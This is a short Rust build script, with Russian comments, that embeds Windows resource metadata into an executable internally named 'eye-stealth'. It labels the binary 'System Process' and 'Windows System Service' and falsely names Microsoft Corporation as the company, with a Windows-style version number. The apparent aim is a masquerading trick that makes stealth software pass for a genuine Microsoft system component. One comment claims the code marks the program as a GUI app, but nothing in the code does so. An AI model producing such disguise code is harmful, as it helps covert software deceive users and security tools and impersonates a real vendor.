use winres::WindowsResource;

fn main() {
    // Только для Windows
    #[cfg(windows)]
    {
        let mut res = WindowsResource::new();
        
        // Указываем, что это GUI приложение (не консольное)
        res.set("InternalName", "eye-stealth");
        res.set("OriginalFilename", "eye-stealth.exe"); 
        res.set("FileDescription", "System Process");
        res.set("ProductName", "Windows System Service");
        res.set("FileVersion", "10.0.19041.1");
        res.set("ProductVersion", "10.0.19041.1");
        res.set("CompanyName", "Microsoft Corporation");
        
        // Компилируем ресурсы
        if let Err(e) = res.compile() {
            eprintln!("Ошибка компиляции ресурсов: {}", e);
        }
    }
}